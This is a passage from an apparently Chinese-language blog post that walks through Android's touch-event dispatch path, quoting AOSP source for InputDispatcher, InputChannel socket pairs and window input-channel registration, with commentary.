sp&lt;EventHubInterface&gt;&amp; eventHub, const sp&lt;InputReaderPolicyInterface&gt;&amp; readerPolicy, const sp&lt;InputDispatcherPolicyInterface&gt;&amp; dispatcherPolicy) &#123; mDispatcher = new InputDispatcher(dispatcherPolicy); mReader = new InputReader(eventHub, readerPolicy, mDispatcher); initialize();&#125; 注意到第6行中，传入的listener正是mDispatcher也就是InputDispatcher对象。 所以说，listener-&gt;notifyMotion(this);调用的是InputDispatcher的notifyMotion()函数，至此，InputReader的工作已经完成，它从EventHub中循环读取地rawEvent事件，并处理成args再通知InputDispatcher对事件进行进一步的分发处理。 InputDispatcher我们直接来到InputDispatcher的源码，路径：frameworks/native/services/inputflinger/InputDispatcher.cpp 上面说到最终调用了InputDispatcher的notifyMotion方法： 12345678910111213MotionEvent event;event.initialize(args-&gt;deviceId, args-&gt;source, args-&gt;action, args-&gt;actionButton,args-&gt;flags, args-&gt;edgeFlags, args-&gt;metaState, args-&gt;buttonState, 0, 0, args-&gt;xPrecision, args-&gt;yPrecision, args-&gt;downTime, args-&gt;eventTime, args-&gt;pointerCount, args-&gt;pointerProperties, args-&gt;pointerCoords);...// Just enqueue a new motion event.MotionEntry* newEntry = new MotionEntry(args-&gt;eventTime, args-&gt;deviceId, args-&gt;source, policyFlags, args-&gt;action, args-&gt;actionButton, args-&gt;flags, args-&gt;metaState, args-&gt;buttonState, args-&gt;edgeFlags, args-&gt;xPrecision, args-&gt;yPrecision, args-&gt;downTime, args-&gt;displayId, args-&gt;pointerCount, args-&gt;pointerProperties, args-&gt;pointerCoords, 0, 0);needWake = enqueueInboundEventLocked(newEntry); 里面新建并初始化了一个MotionEvent，然后包装成一个Entry，然后调用enqueueInboundEventLocked()函数： 1mInboundQueue.enqueueAtTail(entry); 在enqueueInboundEventLocked()函数中将这个entry插入到了mInboundQueue这个InputDispatcher维护的成员变量中。 到这里我们可以看到事件经过一系列的处理和传递以后最终作为一个entry插入到了InputDispatcher的队列中等待被进一步分发。 这个分发过程是在哪里进行的呢？ InputDispatcher线程的threadLoop()函数会被不断调用： 1234bool InputDispatcherThread::threadLoop() &#123; mDispatcher-&gt;dispatchOnce(); return true;&#125; 在dispatcherOnce()中： 123if (!haveCommandsLocked()) &#123; dispatchOnceInnerLocked(&amp;nextWakeupTime);&#125; 在没有待执行的指令时执行dispatchOnceInnerLocked()函数： 1mPendingEvent = mInboundQueue.dequeueAtHead(); 这个函数中还包含了ANR的判断信息，关于ANR的部分之后再另开博文讲。 若mInboundQueue不为空，则从中取出头部的pendingEvent。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354switch (mPendingEvent-&gt;type) &#123;case EventEntry::TYPE_CONFIGURATION_CHANGED: &#123; ConfigurationChangedEntry *typedEntry = static_cast&lt;ConfigurationChangedEntry *&gt;(mPendingEvent); done = dispatchConfigurationChangedLocked(currentTime, typedEntry); dropReason = DROP_REASON_NOT_DROPPED; // configuration changes are never dropped break;&#125;case EventEntry::TYPE_DEVICE_RESET: &#123; DeviceResetEntry *typedEntry = static_cast&lt;DeviceResetEntry *&gt;(mPendingEvent); done = dispatchDeviceResetLocked(currentTime, typedEntry); dropReason = DROP_REASON_NOT_DROPPED; // device resets are never dropped break;&#125;case EventEntry::TYPE_KEY: &#123; KeyEntry *typedEntry = static_cast&lt;KeyEntry *&gt;(mPendingEvent); if (isAppSwitchDue) &#123; if (isAppSwitchKeyEventLocked(typedEntry)) &#123; resetPendingAppSwitchLocked(true); isAppSwitchDue = false; &#125; else if (dropReason == DROP_REASON_NOT_DROPPED) &#123; dropReason = DROP_REASON_APP_SWITCH; &#125; &#125; if (dropReason == DROP_REASON_NOT_DROPPED &amp;&amp; isStaleEventLocked(currentTime, typedEntry)) &#123; dropReason = DROP_REASON_STALE; &#125; if (dropReason == DROP_REASON_NOT_DROPPED &amp;&amp; mNextUnblockedEvent) &#123; dropReason = DROP_REASON_BLOCKED; &#125; done = dispatchKeyLocked(currentTime, typedEntry, &amp;dropReason, nextWakeupTime); break;&#125;case EventEntry::TYPE_MOTION: &#123; MotionEntry *typedEntry = static_cast&lt;MotionEntry *&gt;(mPendingEvent); if (dropReason == DROP_REASON_NOT_DROPPED &amp;&amp; isAppSwitchDue) &#123; dropReason = DROP_REASON_APP_SWITCH; &#125; if (dropReason == DROP_REASON_NOT_DROPPED &amp;&amp; isStaleEventLocked(currentTime, typedEntry)) &#123; dropReason = DROP_REASON_STALE; &#125; if (dropReason == DROP_REASON_NOT_DROPPED &amp;&amp; mNextUnblockedEvent) &#123; dropReason = DROP_REASON_BLOCKED; &#125; done = dispatchMotionLocked(currentTime, typedEntry, &amp;dropReason, nextWakeupTime); break;&#125;default: ALOG_ASSERT(false); break;&#125; 下面对取出的mPendingEvent的类型进行判断，根据不同的类型信息把它转换回原来的Entry信息，然后调用相应的分发方法，我们还是顺着触摸事件分发这条路继续向下走，调用了bool InputDispatcher::dispatchMotionLocked()函数： 12345678910int32_t injectionResult;if (isPointerEvent) &#123;// Pointer event. (eg. touchscreen) injectionResult = findTouchedWindowTargetsLocked(currentTime, entry, inputTargets, nextWakeupTime, &amp;conflictingPointerActions);&#125; else &#123;// Non touch event. (eg. trackball) injectionResult = findFocusedWindowTargetsLocked(currentTime, entry, inputTargets, nextWakeupTime);&#125; 对触摸或轨迹球事件做一个判断，再调用findTouchedWindowTargesLocked()函数： 12345int32_t pointerIndex = getMotionEventActionPointerIndex(action);int32_t x = int32_t(entry-&gt;pointerCoords[pointerIndex]. getAxisValue(AMOTION_EVENT_AXIS_X));int32_t y = int32_t(entry-&gt;pointerCoords[pointerIndex]. getAxisValue(AMOTION_EVENT_AXIS_Y)); 在这里取出了entry里面的pointerIndex与触摸点坐标的x y值。 12345678910111213141516171819202122232425262728293031323334// 从前向后遍历所有的window以找出触摸的windowsize_t numWindows = mWindowHandles.size();for (size_t i = 0; i &lt; numWindows; i++) &#123; sp&lt;InputWindowHandle&gt; windowHandle = mWindowHandles.itemAt(i); const InputWindowInfo *windowInfo = windowHandle-&gt;getInfo(); if (windowInfo-&gt;displayId != displayId) &#123; continue; // 错误的window(displayId不匹配) &#125; int32_t flags = windowInfo-&gt;layoutParamsFlags; if (windowInfo-&gt;visible) &#123; // 如果window可见 if (!(flags &amp; InputWindowInfo::FLAG_NOT_TOUCHABLE)) &#123; isTouchModal = (flags &amp; (InputWindowInfo::FLAG_NOT_FOCUSABLE | InputWindowInfo::FLAG_NOT_TOUCH_MODAL)) == 0; // window可以被触摸 if (isTouchModal || windowInfo-&gt;touchableRegionContainsPoint(x, y)) &#123; // (x,y)在window内可触摸区域内 newTouchedWindowHandle = windowHandle; break; // 找到触摸的window，保存在newTouchedWindowHandle中 &#125; &#125; // 判断是否触摸window之外的区域 if (maskedAction == AMOTION_EVENT_ACTION_DOWN &amp;&amp; (flags &amp; InputWindowInfo::FLAG_WATCH_OUTSIDE_TOUCH)) &#123; int32_t outsideTargetFlags = InputTarget::FLAG_DISPATCH_AS_OUTSIDE; if (isWindowObscuredAtPointLocked(windowHandle, x, y)) &#123; outsideTargetFlags |= InputTarget::FLAG_WINDOW_IS_OBSCURED; &#125; else if (isWindowObscuredLocked(windowHandle)) &#123; outsideTargetFlags |= InputTarget::FLAG_WINDOW_IS_PARTIALLY_OBSCURED; &#125; mTempTouchState.addOrUpdateWindow(windowHandle, outsideTargetFlags, BitSet32(0)); &#125; &#125;&#125; 这段代码的目的是为了遍历所有的window找到触摸对应的那个window。 12345678910// Handle the case where we did not find a window.if (newTouchedWindowHandle == NULL) &#123; // Try to assign the pointer to the first foreground window we find, if there is one. newTouchedWindowHandle = mTempTouchState.getFirstForegroundWindowHandle(); if (newTouchedWindowHandle == NULL) &#123; ALOGI(\"Dropping event because there is no touchable window at (%d, %d).\", x, y); injectionResult = INPUT_EVENT_INJECTION_FAILED; goto Failed; &#125;&#125; 如果遍历后没有找到合适的window，那就取第一个前台的window。 然后通过addWindowTargetLocked()方法把缓存下来的结果存放入inputTargets中。 12345for (size_t i = 0; i &lt; mTempTouchState.windows.size(); i++) &#123; const TouchedWindow&amp; touchedWindow = mTempTouchState.windows.itemAt(i); addWindowTargetLocked(touchedWindow.windowHandle, touchedWindow.targetFlags, touchedWindow.pointerIds, inputTargets);&#125; 12345678910111213void InputDispatcher::addWindowTargetLocked(const sp&lt;InputWindowHandle&gt;&amp; windowHandle, int32_t targetFlags, BitSet32 pointerIds, Vector&lt;InputTarget&gt;&amp; inputTargets) &#123; inputTargets.push(); const InputWindowInfo* windowInfo = windowHandle-&gt;getInfo(); InputTarget&amp; target = inputTargets.editTop(); target.inputChannel = windowInfo-&gt;inputChannel; target.flags = targetFlags; target.xOffset = - windowInfo-&gt;frameLeft; target.yOffset = - windowInfo-&gt;frameTop; target.scaleFactor = windowInfo-&gt;scaleFactor; target.pointerIds = pointerIds;&#125; 函数将原始的window数据进行了再次封装。 找到合适的window或是没有找到（处理错误）之后，函数返回到bool InputDispatcher::dispatchMotionLocked()中： 1dispatchEventLocked(currentTime, entry, inputTargets); 开始向inputTargets中的目标分发事件： 123456789101112131415void InputDispatcher::dispatchEventLocked(nsecs_t currentTime, EventEntry* eventEntry, const Vector&lt;InputTarget&gt;&amp; inputTargets) &#123;... for (size_t i = 0; i &lt; inputTargets.size(); i++) &#123; const InputTarget&amp; inputTarget = inputTargets.itemAt(i); // 遍历目标 ssize_t connectionIndex = getConnectionIndexLocked(inputTarget.inputChannel); // 见下文 if (connectionIndex &gt;= 0) &#123; sp&lt;Connection&gt; connection = mConnectionsByFd.valueAt(connectionIndex); prepareDispatchCycleLocked(currentTime, connection, eventEntry, &amp;inputTarget); &#125; else &#123;... &#125; &#125;&#125; inputTarget中包含的inputChannel就是后面用于与window实例通信的关键： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657/* * An input channel consists of a local unix domain socket used to send and receive * input messages across processes. Each channel has a descriptive name for debugging purposes. * * Each endpoint has its own InputChannel object that specifies its file descriptor. * * The input channel is closed when all references to it are released. */class InputChannel : public RefBase &#123; protected: virtual ~InputChannel();public: InputChannel(const String8&amp; name, int fd); /* Creates a pair of input channels. * * Returns OK on success. */ static status_t openInputChannelPair(const String8&amp; name, sp&lt;InputChannel&gt;&amp; outServerChannel, sp&lt;InputChannel&gt;&amp; outClientChannel); inline String8 getName() const &#123; return mName; &#125; inline int getFd() const &#123; return mFd; &#125; /* Sends a message to the other endpoint. * * If the channel is full then the message is guaranteed not to have been sent at all. * Try again after the consumer has sent a finished signal indicating that it has * consumed some of the pending messages from the channel. * * Returns OK on success. * Returns WOULD_BLOCK if the channel is full. * Returns DEAD_OBJECT if the channel's peer has been closed. * Other errors probably indicate that the channel is broken. */ status_t sendMessage(const InputMessage* msg); /* Receives a message sent by the other endpoint. * * If there is no message present, try again after poll() indicates that the fd * is readable. * * Returns OK on success. * Returns WOULD_BLOCK if there is no message present. * Returns DEAD_OBJECT if the channel's peer has been closed. * Other errors probably indicate that the channel is broken. */ status_t receiveMessage(InputMessage* msg); /* Returns a new object that has a duplicate of this channel's fd. */ sp&lt;InputChannel&gt; dup() const;private: String8 mName; int mFd;&#125;; InputChannel包含了一个本地unix socket用于跨进程发送与接收输入信息。 它的接口十分简单，我们就通过sendMessage()与receiveMessage()两个函数实现跨进程通信。 回到之前，我们通过这个inputChannel的Fd（文件描述符）来获取一个Connection的索引，然后根据这个索引从mConnectionsByFd中获取connection对象。 12345678910ssize_t InputDispatcher::getConnectionIndexLocked(const sp&lt;InputChannel&gt;&amp; inputChannel) &#123; ssize_t connectionIndex = mConnectionsByFd.indexOfKey(inputChannel-&gt;getFd()); if (connectionIndex &gt;= 0) &#123; sp&lt;Connection&gt; connection = mConnectionsByFd.valueAt(connectionIndex); if (connection-&gt;inputChannel.get() == inputChannel.get()) &#123; return connectionIndex; &#125; &#125; return -1;&#125; 这个mConnectionByFd又是怎么建立起来的呢？在InputDispatcher中包含了一个registerInputChannel函数： 1234567891011121314151617181920212223status_t InputDispatcher::registerInputChannel(const sp&lt;InputChannel&gt;&amp; inputChannel, const sp&lt;InputWindowHandle&gt;&amp; inputWindowHandle, bool monitor) &#123;... &#123; // acquire lock AutoMutex _l(mLock);... sp&lt;Connection&gt; connection = new Connection(inputChannel, inputWindowHandle, monitor); int fd = inputChannel-&gt;getFd(); mConnectionsByFd.add(fd, connection); if (monitor) &#123; mMonitoringChannels.push(inputChannel); &#125; mLooper-&gt;addFd(fd, 0, ALOOPER_EVENT_INPUT, handleReceiveCallback, this); &#125; // release lock // Wake the looper because some connections have changed. mLooper-&gt;wake(); return OK;&#125; connection对象就是在这里由inputChannel构造并加入到mConnectionsByFd中的。而mConnectionsByFd本身是一个以Fd为索引的键值对： 1KeyedVector&lt;int, sp&lt;Connection&gt; &gt; mConnectionsByFd; 取得connection对象之后，进入到了prepareDispatchCycleLocked()函数中，这个函数对连接的状态是否正常进行检测，连接正常会调用enqueueDispatchEntriesLocked()函数： 1234567891011121314151617181920212223void InputDispatcher::enqueueDispatchEntriesLocked(nsecs_t currentTime, const sp&lt;Connection&gt;&amp; connection, EventEntry* eventEntry, const InputTarget* inputTarget) &#123; bool wasEmpty = connection-&gt;outboundQueue.isEmpty(); // Enqueue dispatch entries for the requested modes. enqueueDispatchEntryLocked(connection, eventEntry, inputTarget, InputTarget::FLAG_DISPATCH_AS_HOVER_EXIT); enqueueDispatchEntryLocked(connection, eventEntry, inputTarget, InputTarget::FLAG_DISPATCH_AS_OUTSIDE); enqueueDispatchEntryLocked(connection, eventEntry, inputTarget, InputTarget::FLAG_DISPATCH_AS_HOVER_ENTER); enqueueDispatchEntryLocked(connection, eventEntry, inputTarget, InputTarget::FLAG_DISPATCH_AS_IS); enqueueDispatchEntryLocked(connection, eventEntry, inputTarget, InputTarget::FLAG_DISPATCH_AS_SLIPPERY_EXIT); enqueueDispatchEntryLocked(connection, eventEntry, inputTarget, InputTarget::FLAG_DISPATCH_AS_SLIPPERY_ENTER); // If the outbound queue was previously empty, start the dispatch cycle going. if (wasEmpty &amp;&amp; !connection-&gt;outboundQueue.isEmpty()) &#123; startDispatchCycleLocked(currentTime, connection); &#125;&#125; 中间调用了一系列的enqueueDispatchEntryLocked()函数： 1234567891011121314151617181920void InputDispatcher::enqueueDispatchEntryLocked( const sp&lt;Connection&gt;&amp; connection, EventEntry* eventEntry, const InputTarget* inputTarget, int32_t dispatchMode) &#123; int32_t inputTargetFlags = inputTarget-&gt;flags; if (!(inputTargetFlags &amp; dispatchMode)) &#123; return; &#125; inputTargetFlags = (inputTargetFlags &amp; ~InputTarget::FLAG_DISPATCH_MASK) | dispatchMode; // This is a new event. // Enqueue a new dispatch entry onto the outbound queue for this connection. DispatchEntry* dispatchEntry = new DispatchEntry(eventEntry, // increments ref inputTargetFlags, inputTarget-&gt;xOffset, inputTarget-&gt;yOffset, inputTarget-&gt;scaleFactor);... // Enqueue the dispatch entry. connection-&gt;outboundQueue.enqueueAtTail(dispatchEntry); traceOutboundQueueLengthLocked(connection);...&#125; 省略的代码对entry进行了进一步的包装，然后在最后加入到了connection维护的outboundQueue中。 回到上面，之后调用startDispatchCycleLocked()正式开始分发事件： 123456789while (connection-&gt;status == Connection::STATUS_NORMAL &amp;&amp; !connection-&gt;outboundQueue.isEmpty()) &#123; DispatchEntry* dispatchEntry = connection-&gt;outboundQueue.head; dispatchEntry-&gt;deliveryTime = currentTime; // Publish the event. status_t status; EventEntry* eventEntry = dispatchEntry-&gt;eventEntry; switch (eventEntry-&gt;type) &#123; 从connection的outboundQueue取出entry之后，根据事件类型的不同对事件进一步处理： 123456789101112131415161718192021222324252627282930313233case EventEntry::TYPE_MOTION: &#123; MotionEntry* motionEntry = static_cast&lt;MotionEntry*&gt;(eventEntry); PointerCoords scaledCoords[MAX_POINTERS]; const PointerCoords* usingCoords = motionEntry-&gt;pointerCoords; // Set the X and Y offset depending on the input source. float xOffset, yOffset, scaleFactor; if ((motionEntry-&gt;source &amp; AINPUT_SOURCE_CLASS_POINTER) &amp;&amp; !(dispatchEntry-&gt;targetFlags &amp; InputTarget::FLAG_ZERO_COORDS)) &#123; scaleFactor = dispatchEntry-&gt;scaleFactor; xOffset = dispatchEntry-&gt;xOffset * scaleFactor; yOffset = dispatchEntry-&gt;yOffset * scaleFactor; if (scaleFactor != 1.0f) &#123; for (uint32_t i = 0; i &lt; motionEntry-&gt;pointerCount; i++) &#123; scaledCoords[i] = motionEntry-&gt;pointerCoords[i]; scaledCoords[i].scale(scaleFactor); &#125; usingCoords = scaledCoords; &#125; &#125; else &#123; xOffset = 0.0f; yOffset = 0.0f; scaleFactor = 1.0f; // We don't want the dispatch target to know. if (dispatchEntry-&gt;targetFlags &amp; InputTarget::FLAG_ZERO_COORDS) &#123; for (uint32_t i = 0; i &lt; motionEntry-&gt;pointerCount; i++) &#123; scaledCoords[i].clear(); &#125; usingCoords = scaledCoords; &#125; &#125; 在对事件的坐标进行解析（缩放）之后，进入下面的发布过程： 123456789101112 // Publish the motion event. status = connection-&gt;inputPublisher.publishMotionEvent(dispatchEntry-&gt;seq, motionEntry-&gt;deviceId, motionEntry-&gt;source, dispatchEntry-&gt;resolvedAction, motionEntry-&gt;actionButton, dispatchEntry-&gt;resolvedFlags, motionEntry-&gt;edgeFlags, motionEntry-&gt;metaState, motionEntry-&gt;buttonState, xOffset, yOffset, motionEntry-&gt;xPrecision, motionEntry-&gt;yPrecision, motionEntry-&gt;downTime, motionEntry-&gt;eventTime, motionEntry-&gt;pointerCount, motionEntry-&gt;pointerProperties, usingCoords); break;&#125; 实际上调用了InputPublisher的publishMotionEvent()函数： 1234567891011121314151617181920212223InputMessage msg;msg.header.type = InputMessage::TYPE_MOTION;msg.body.motion.seq = seq;msg.body.motion.deviceId = deviceId;msg.body.motion.source = source;msg.body.motion.action = action;msg.body.motion.actionButton = actionButton;msg.body.motion.flags = flags;msg.body.motion.edgeFlags = edgeFlags;msg.body.motion.metaState = metaState;msg.body.motion.buttonState = buttonState;msg.body.motion.xOffset = xOffset;msg.body.motion.yOffset = yOffset;msg.body.motion.xPrecision = xPrecision;msg.body.motion.yPrecision = yPrecision;msg.body.motion.downTime = downTime;msg.body.motion.eventTime = eventTime;msg.body.motion.pointerCount = pointerCount;for (uint32_t i = 0; i &lt; pointerCount; i++) &#123; msg.body.motion.pointers[i].properties.copyFrom(pointerProperties[i]); msg.body.motion.pointers[i].coords.copyFrom(pointerCoords[i]);&#125;return mChannel-&gt;sendMessage(&amp;msg); 函数里封装了一个msg，然后最终调用了mChannel的sendMessage()方法进行跨进程通信。 现在我们到了图中的这一步： 我们的点击事件来到了建立的socket中，准备与交付给对应的app，我们知道每个app运行在自己的进程中，所以就需要使用socket来进行跨进程通信。 InputChannel连接建立过程本段内容主要参考了 Gityuan的博客 详细分析及代码请移步上面链接。 连接的建立是在一个Activity启动时进行的。 Activity的启动是一个比较复杂的过程，会经过ActivityManagerService与WindowManagerService的层层调用，最终到达WindowManagerGlobal的addView()方法。 12345678910111213public void addView(View view, ViewGroup.LayoutParams params, Display display, Window parentWindow) &#123; ... ViewRootImpl root; View panelParentView = null; ... root = new ViewRootImpl(view.getContext(), display); ... root.setView(view, wparams, panelParentView); ...&#125; 在addView中，创建并初始化了一个ViewRootImpl对象，并调用了它的setView()方法。 ViewRootImpl的初始化过程： 12345public ViewRootImpl(Context context, Display display) &#123; ... mWindowSession = WindowManagerGlobal.getWindowSession(); ...&#125; 这里我们关注的是这个mWindowSession对象的初始化。 12345678910111213141516171819202122public static IWindowSession getWindowSession() &#123; synchronized (WindowManagerGlobal.class) &#123; if (sWindowSession == null) &#123; try &#123; InputMethodManager imm = InputMethodManager.getInstance(); IWindowManager windowManager = getWindowManagerService(); // 获取Session对象，利用Binder机制调用系统线程的方法 sWindowSession = windowManager.openSession( new IWindowSessionCallback.Stub() &#123; @Override public void onAnimatorScaleChanged(float scale) &#123; ValueAnimator.setDurationScale(scale); &#125; &#125;, imm.getClient(), imm.getInputContext()); &#125; catch (RemoteException e) &#123; throw e.rethrowFromSystemServer(); &#125; &#125; return sWindowSession; &#125;&#125; 下面是setView()： 1234567891011121314public void setView(View view, WindowManager.LayoutParams attrs, View panelParentView) &#123; ... // 服务端过程 res = mWindowSession.addToDisplay(mWindow, mSeq, mWindowAttributes, getHostVisibility(), mDisplay.getDisplayId(), mAttachInfo.mContentInsets, mAttachInfo.mStableInsets, mAttachInfo.mOutsets, mInputChannel); ... // 客户端过程 if (mInputChannel != null) &#123; mInputEventReceiver = new WindowInputEventReceiver(mInputChannel, Looper.myLooper()); &#125; ...&#125; 上面的两行语句分别的对应两个注册过程的开始，先执行服务端的注册与监听，再执行客户端的注册与监听。 下面对这两个过程分别进行追踪。 服务端过程通过刚刚获取的mWindowSession去调用系统线程中的addToDisplay()方法： 123456789101112131415161718192021222324252627 @Override public int addToDisplay(IWindow window, int seq, WindowManager.LayoutParams attrs, int viewVisibility, int displayId, Rect outContentInsets, Rect outStableInsets, Rect outOutsets, InputChannel outInputChannel) &#123; return mService.addWindow(this, window, seq, attrs, viewVisibility, displayId, outContentInsets, outStableInsets, outOutsets, outInputChannel); &#125;...这个`mService`自然就是之前获取它使用的`WindowManagerService`，调用它的`addWindow()`方法：​```java public int addWindow(Session session, IWindow client, int seq, WindowManager.LayoutParams attrs, int viewVisibility, int displayId, Rect outContentInsets, Rect outStableInsets, Rect outOutsets, InputChannel outInputChannel) &#123; ... WindowState win = new WindowState(this, session, client, token, attachedWindow, appOp[0], seq, attrs, viewVisibility, displayContent); ... final boolean openInputChannels = (outInputChannel != null &amp;&amp; (attrs.inputFeatures &amp; INPUT_FEATURE_NO_INPUT_CHANNEL) == 0); if (openInputChannels) &#123; win.openInputChannel(outInputChannel); &#125; ... &#125; 我们关注的是它创建并初始化了WindowState对象，然后调用了它的openInputChannel()方法： 123456789101112131415161718192021void openInputChannel(InputChannel outInputChannel) &#123; if (mInputChannel != null) &#123; throw new IllegalStateException(\"Window already has an input channel.\"); &#125; String name = makeInputChannelName(); InputChannel[] inputChannels = InputChannel.openInputChannelPair(name); mInputChannel = inputChannels[0]; // 这里将服务端的inputChannel保存在了WindowState中 mClientChannel = inputChannels[1]; mInputWindowHandle.inputChannel = inputChannels[0]; if (outInputChannel != null) &#123; mClientChannel.transferTo(outInputChannel); mClientChannel.dispose(); mClientChannel = null; &#125; else &#123; // If the window died visible, we setup a dummy input channel, so that taps // can still detected by input monitor channel, and we can relaunch the app. // Create dummy event receiver that simply reports all events as handled. mDeadWindowEventReceiver = new DeadWindowEventReceiver(mClientChannel); &#125; mService.mInputManager.registerInputChannel(mInputChannel, mInputWindowHandle);&#125; 在这里创建了两个InputChannel对象，其中作为服务端存放在系统进程中的是inputChannels[0]，作为客户端的存放在app的ui主线程中的是inputChannels[1]。它们的传递过程之后再看，我们先看InputChannel建立时调用的openInputChannelPair()方法： 12345678910public static InputChannel[] openInputChannelPair(String name) &#123; if (name == null) &#123; throw new IllegalArgumentException(\"name must not be null\"); &#125; if (DEBUG) &#123; Slog.d(TAG, \"Opening input channel pair '\" + name + \"'\"); &#125; return nativeOpenInputChannelPair(name);&#125; 调用了native方法： 123456789static jobjectArray android_view_InputChannel_nativeOpenInputChannelPair(JNIEnv* env, jclass clazz, jstring nameObj) &#123; ... sp&lt;InputChannel&gt; serverChannel; sp&lt;InputChannel&gt; clientChannel; status_t result = InputChannel::openInputChannelPair(name, serverChannel, clientChannel); ... return channelPair;&#125; 在这里就分为了serverChannel与clientChannel，作为openInputChannelPair调用的两参数来成对地创建： 123456789101112131415161718192021222324252627status_t InputChannel::openInputChannelPair(const String8&amp; name, sp&lt;InputChannel&gt;&amp; outServerChannel, sp&lt;InputChannel&gt;&amp; outClientChannel) &#123; int sockets[2]; if (socketpair(AF_UNIX, SOCK_SEQPACKET, 0, sockets)) &#123; status_t result = -errno; ALOGE(\"channel '%s' ~ Could not create socket pair. errno=%d\", name.string(), errno); outServerChannel.clear(); outClientChannel.clear(); return result; &#125; int bufferSize = SOCKET_BUFFER_SIZE; setsockopt(sockets[0], SOL_SOCKET, SO_SNDBUF, &amp;bufferSize, sizeof(bufferSize)); setsockopt(sockets[0], SOL_SOCKET, SO_RCVBUF, &amp;bufferSize, sizeof(bufferSize)); setsockopt(sockets[1], SOL_SOCKET, SO_SNDBUF, &amp;bufferSize, sizeof(bufferSize)); setsockopt(sockets[1], SOL_SOCKET, SO_RCVBUF, &amp;bufferSize, sizeof(bufferSize)); String8 serverChannelName = name; serverChannelName.append(\" (server)\"); outServerChannel = new InputChannel(serverChannelName, sockets[0]); String8 clientChannelName = name; clientChannelName.append(\" (client)\"); outClientChannel = new InputChannel(clientChannelName, sockets[1]); return OK;&#125; 我们可以看到第4行使用了系统调用socketpair()来创建一对本地socket对象，使用int数组sockets来接收创建好的fd。 下面使用系统调用setsockopt()来为新建的socket进行配置，设置了socket实体的输入输出buff大小。 第21、25行调用了Native InputChannel的构造方法以name+(server)或name+(client)作为名字参数与创建好的socket作为fd参数来构造InputChannel对象，它的构造方法： 1234567891011InputChannel::InputChannel(const String8&amp; name, int fd) : mName(name), mFd(fd) &#123;#if DEBUG_CHANNEL_LIFECYCLE ALOGD(\"Input channel constructed: name='%s', fd=%d\", mName.string(), fd);#endif int result = fcntl(mFd, F_SETFL, O_NONBLOCK); LOG_ALWAYS_FATAL_IF(result != 0, \"channel '%s' ~ Could not make socket \" \"non-blocking. errno=%d\", mName.string(), errno);&#125; 将name fd保存到域中，并配置了fd。 现在我们的两个InputChannel（实际上是一对本地socket的封装）就创建好了。 现在我们回到WindowState的openInputChannel()方法中，在成功创建两个InputChannel后，调用了mService.mInputManager.registerInputChannel(mInputChannel, mInputWindowHandle);： 12345678public void registerInputChannel(InputChannel inputChannel, InputWindowHandle inputWindowHandle) &#123; if (inputChannel == null) &#123; throw new IllegalArgumentException(\"inputChannel must not be null.\"); &#125; nativeRegisterInputChannel(mPtr, inputChannel, inputWindowHandle, false);&#125; 1234567891011121314static void nativeRegisterInputChannel(JNIEnv* env, jclass /* clazz */, jlong ptr, jobject inputChannelObj, jobject inputWindowHandleObj, jboolean monitor) &#123; NativeInputManager* im = reinterpret_cast&lt;NativeInputManager*&gt;(ptr); sp&lt;InputChannel&gt; inputChannel = android_view_InputChannel_getInputChannel(env, inputChannelObj); ... sp&lt;InputWindowHandle&gt; inputWindowHandle = android_server_InputWindowHandle_getHandle(env, inputWindowHandleObj); status_t status = im-&gt;registerInputChannel( env, inputChannel, inputWindowHandle, monitor); ...&#125; 123456status_t NativeInputManager::registerInputChannel(JNIEnv* /* env */, const sp&lt;InputChannel&gt;&amp; inputChannel, const sp&lt;InputWindowHandle&gt;&amp; inputWindowHandle, bool monitor) &#123; return mInputManager-&gt;getDispatcher()-&gt;registerInputChannel( inputChannel, inputWindowHandle, monitor);&#125; getDispatcher()返回了InputDispatcher对象，这个方法就调用了我们之前提到过的InputDispatcher::registerInputchannel()方法，向InputDispatcher注册了我们创建好的InputChannel服务端。 我们回顾一下这个方法： 1234567891011121314151617181920212223status_t InputDispatcher::registerInputChannel(const sp&lt;InputChannel&gt;&amp; inputChannel, const sp&lt;InputWindowHandle&gt;&amp; inputWindowHandle, bool monitor) &#123;... &#123; // acquire lock AutoMutex _l(mLock);... sp&lt;Connection&gt; connection = new Connection(inputChannel, inputWindowHandle, monitor); int fd = inputChannel-&gt;getFd(); mConnectionsByFd.add(fd, connection); if (monitor) &#123; mMonitoringChannels.push(inputChannel); &#125; mLooper-&gt;addFd(fd, 0, ALOOPER_EVENT_INPUT, handleReceiveCallback, this); &#125; // release lock // Wake the looper because some connections have changed. mLooper-&gt;wake(); return OK;&#125; 将InputChannel的Fd作为索引保存到InputDispatcher中。 然后调用mLooper的addFd在Native Looper中设置自定义fd进行监听，传入了handleReceiveCallback()函数作为参数，这样一来，在服务端收到消息时就会进行回调。关于Native Looper处理事件的分析可见另一系列的博文。 客户端过程1234// 客户端过程if (mInputChannel != null) &#123; mInputEventReceiver = new WindowInputEventReceiver(mInputChannel, Looper.myLooper());&#125; 这里以客户端InputChannel与当前应用的Looper作为参数，初始化了WindowInputEventReceiver对象： 123456789public InputEventReceiver(InputChannel inputChannel, Looper looper) &#123; ... mInputChannel = inputChannel; mMessageQueue = looper.getQueue(); mReceiverPtr = nativeInit(new WeakReference&lt;InputEventReceiver&gt;(this), inputChannel, mMessageQueue); mCloseGuard.open(\"dispose\");&#125; 获取了app进程的消息队列，并调用native方法对mReceiverPtr进行初始化： 12345678910111213141516static jlong nativeInit(JNIEnv* env, jclass clazz, jobject receiverWeak, jobject inputChannelObj, jobject messageQueueObj) &#123; ... sp&lt;InputChannel&gt; inputChannel = android_view_InputChannel_getInputChannel(env, inputChannelObj); sp&lt;MessageQueue&gt; messageQueue = android_os_MessageQueue_getMessageQueue(env, messageQueueObj); ... sp&lt;NativeInputEventReceiver&gt; receiver = new NativeInputEventReceiver(env, receiverWeak, inputChannel, messageQueue); status_t status = receiver-&gt;initialize(); ... receiver-&gt;incStrong(gInputEventReceiverClassInfo.clazz); // retain a reference for the object return reinterpret_cast&lt;jlong&gt;(receiver.get());&#125; 创建了NativeInputEventReceiver对象，并调用initialize()方法进行初始化： 1234status_t NativeInputEventReceiver::initialize() &#123; setFdEvents(ALOOPER_EVENT_INPUT); return OK;&#125; 1234567891011void NativeInputEventReceiver::setFdEvents(int events) &#123; if (mFdEvents != events) &#123; mFdEvents = events; int fd = mInputConsumer.getChannel()-&gt;getFd(); if (events) &#123; mMessageQueue-&gt;getLooper()-&gt;addFd(fd, 0, events, this, NULL); &#125; else &#123; mMessageQueue-&gt;getLooper()-&gt;removeFd(fd); &#125; &#125;&#125; 这里将客户端的InputChannel保存的Fd加入到了Native 